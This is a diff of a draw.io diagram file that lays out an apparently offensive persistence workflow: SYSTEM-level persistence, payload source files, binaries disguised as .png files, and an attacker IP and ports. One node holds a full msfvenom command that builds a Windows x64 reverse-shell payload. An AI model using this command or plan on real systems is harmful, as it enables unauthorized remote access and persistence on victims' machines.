@@ -1,6 +1,6 @@
-<mxfile host="app.diagrams.net" modified="2022-12-23T14:11:35.952Z" agent="5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" etag="hD0QpAtsV369_F1WecHA" version="20.7.4" type="github" pages="2">
+<mxfile host="app.diagrams.net" modified="2022-12-23T14:15:07.022Z" agent="5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" etag="pcgeAWUk2YLJ985ly_2Y" version="20.7.4" type="github">
   <diagram id="C5RBs43oDa-KdzZeNtuy" name="Overall">
-    <mxGraphModel dx="2774" dy="457" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
+    <mxGraphModel dx="3254" dy="653" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="827" pageHeight="1169" math="0" shadow="0">
       <root>
         <mxCell id="WIyWlLk6GJQsqaUBKTNV-0" />
         <mxCell id="WIyWlLk6GJQsqaUBKTNV-1" parent="WIyWlLk6GJQsqaUBKTNV-0" />
@@ -333,14 +333,33 @@
         <mxCell id="c0Sctn81WB5nrNk0CtNy-44" value="Establish High IL&amp;nbsp;&lt;br&gt;/ SYSTEM Persistence" style="rhombus;whiteSpace=wrap;html=1;shadow=0;fontFamily=Helvetica;fontSize=12;align=center;strokeWidth=1;spacing=6;spacingTop=-4;" vertex="1" parent="WIyWlLk6GJQsqaUBKTNV-1">
           <mxGeometry x="140" y="790" width="160" height="110" as="geometry" />
         </mxCell>
-      </root>
-    </mxGraphModel>
-  </diagram>
-  <diagram id="bf5JVRvlxyUvXe34iGP1" name="Pers_Medium.exe">
-    <mxGraphModel dx="1332" dy="491" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="850" pageHeight="1100" math="0" shadow="0">
-      <root>
-        <mxCell id="0" />
-        <mxCell id="1" parent="0" />
+        <mxCell id="Op0RA1QyIyzGp62vVNNJ-0" value="Update Persistance Payload Code" style="swimlane;fillColor=#FF6666;" vertex="1" parent="WIyWlLk6GJQsqaUBKTNV-1">
+          <mxGeometry x="470" y="1000" width="1130" height="140" as="geometry" />
+        </mxCell>
+        <mxCell id="Op0RA1QyIyzGp62vVNNJ-1" value="Pers_High.cpp" style="swimlane;fontStyle=5;childLayout=stackLayout;horizontal=1;startSize=30;horizontalStack=0;resizeParent=1;resizeParentMax=0;resizeLast=0;collapsible=1;marginBottom=0;fillColor=#FF6666;" vertex="1" parent="Op0RA1QyIyzGp62vVNNJ-0">
+          <mxGeometry x="20" y="40" width="150" height="70" as="geometry" />
+        </mxCell>
+        <mxCell id="Op0RA1QyIyzGp62vVNNJ-2" value="High IL Tools Directory&#xa;(9201.exe / 9202.exe)" style="text;strokeColor=none;fillColor=#FF6666;align=left;verticalAlign=middle;spacingLeft=4;spacingRight=4;overflow=hidden;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;rotatable=0;" vertex="1" parent="Op0RA1QyIyzGp62vVNNJ-1">
+          <mxGeometry y="30" width="150" height="40" as="geometry" />
+        </mxCell>
+        <mxCell id="Op0RA1QyIyzGp62vVNNJ-3" value="9201.cpp&#xa;9202.cpp" style="swimlane;fontStyle=5;childLayout=stackLayout;horizontal=1;startSize=30;horizontalStack=0;resizeParent=1;resizeParentMax=0;resizeLast=0;collapsible=1;marginBottom=0;fillColor=#FF6666;" vertex="1" parent="Op0RA1QyIyzGp62vVNNJ-0">
+          <mxGeometry x="200" y="40" width="150" height="70" as="geometry" />
+        </mxCell>
+        <mxCell id="Op0RA1QyIyzGp62vVNNJ-4" value="High IL Tools Directory&#xa;(9201.png / 9202.png)" style="text;strokeColor=none;fillColor=#FF6666;align=left;verticalAlign=middle;spacingLeft=4;spacingRight=4;overflow=hidden;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;rotatable=0;" vertex="1" parent="Op0RA1QyIyzGp62vVNNJ-3">
+          <mxGeometry y="30" width="150" height="40" as="geometry" />
+        </mxCell>
+        <mxCell id="Op0RA1QyIyzGp62vVNNJ-5" value="9201.raw&#xa;9202.raw" style="swimlane;fontStyle=5;childLayout=stackLayout;horizontal=1;startSize=30;horizontalStack=0;resizeParent=1;resizeParentMax=0;resizeLast=0;collapsible=1;marginBottom=0;shadow=0;fillColor=#FF6666;" vertex="1" parent="Op0RA1QyIyzGp62vVNNJ-0">
+          <mxGeometry x="400" y="40" width="140" height="90" as="geometry" />
+        </mxCell>
+        <mxCell id="Op0RA1QyIyzGp62vVNNJ-6" value="Attacker IP" style="text;strokeColor=none;fillColor=#FF6666;align=left;verticalAlign=middle;spacingLeft=4;spacingRight=4;overflow=hidden;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;rotatable=0;shadow=0;" vertex="1" parent="Op0RA1QyIyzGp62vVNNJ-5">
+          <mxGeometry y="30" width="140" height="30" as="geometry" />
+        </mxCell>
+        <mxCell id="Op0RA1QyIyzGp62vVNNJ-7" value="Port (9201 / 9202)" style="text;strokeColor=none;fillColor=#FF6666;align=left;verticalAlign=middle;spacingLeft=4;spacingRight=4;overflow=hidden;points=[[0,0.5],[1,0.5]];portConstraint=eastwest;rotatable=0;shadow=0;" vertex="1" parent="Op0RA1QyIyzGp62vVNNJ-5">
+          <mxGeometry y="60" width="140" height="30" as="geometry" />
+        </mxCell>
+        <mxCell id="Op0RA1QyIyzGp62vVNNJ-8" value="msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp -n 1800 --pad-nops LHOST=IP LPORT=Port -f raw EXITFUNC=thread &amp;gt; port#.raw" style="shape=document;whiteSpace=wrap;html=1;boundedLbl=1;fillColor=#FF6666;" vertex="1" parent="Op0RA1QyIyzGp62vVNNJ-0">
+          <mxGeometry x="550" y="60" width="570" height="50" as="geometry" />
+        </mxCell>
       </root>
     </mxGraphModel>
   </diagram>
